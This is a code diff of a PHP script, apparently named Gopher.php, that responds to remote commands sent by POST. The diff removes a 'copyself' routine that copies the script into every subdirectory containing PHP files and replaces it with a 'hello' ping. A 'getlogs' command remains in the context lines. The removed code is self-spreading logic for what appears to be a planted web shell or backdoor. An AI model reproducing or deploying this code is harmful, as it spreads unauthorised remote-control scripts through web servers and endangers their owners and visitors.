@@ -1,22 +1,9 @@
 <?php
 if (isset($_POST["op"]))
 {
-   if ($_POST["op"]=="copyself") {
+   if ($_POST["op"]=="hello") {
 
-      echo "Starting copy self. \n";
-
-      $directories = glob(__DIR__ . '/*' , GLOB_ONLYDIR);
-
-      foreach ( $directories as $directory )
-      {
-         $phpfiles = glob($directory.'/*.php');
-
-         if (count($phpfiles) > 0 )
-         {
-            echo "GOPHER: copying Gopher.php to ... ". $directory . "\n";
-            copy(__FILE__,$directory.'/Gopher.php');
-         }
-      }
+      echo "Hi, I'm here. \n";
       die(1);
    } else
    if ($_POST["op"]=="getlogs") {
